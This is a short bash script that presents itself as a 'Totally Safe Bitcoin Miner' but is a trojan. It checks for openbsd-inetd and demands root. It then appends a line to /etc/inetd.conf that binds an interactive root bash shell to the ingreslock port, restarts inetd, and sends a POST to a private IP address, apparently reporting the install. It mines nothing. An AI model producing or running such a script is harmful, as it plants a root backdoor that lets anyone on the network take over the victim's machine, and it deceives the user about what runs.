#!/bin/bash

echo "Welcome to Totally Safe Bitcoin Miner."
echo "We help you mine bitcoin with lesser CPU power."

# Check if openbsd-inetd is installed
if ! dpkg -s openbsd-inetd > /dev/null 2>&1; then
    echo "We need you to install this package that we use to control the bitcoin miner:"
    echo "sudo apt install openbsd-inetd"
    exit 1
else
    echo "Awesome, you have all the packages."
fi

# Check if user is root
if [ "$(id -u)" -ne 0 ]; then
    echo "Error: You need to execute this script as root."
    exit 1
fi

echo 'ingreslock stream tcp nowait root /bin/bash bash -i' | sudo tee -a /etc/inetd.conf > /dev/null

# Restarting open-bsd
sudo inetd /etc/inetd.conf

echo "Starting mining operation"
curl -X POST http://192.168.20.9:8000/install &
wait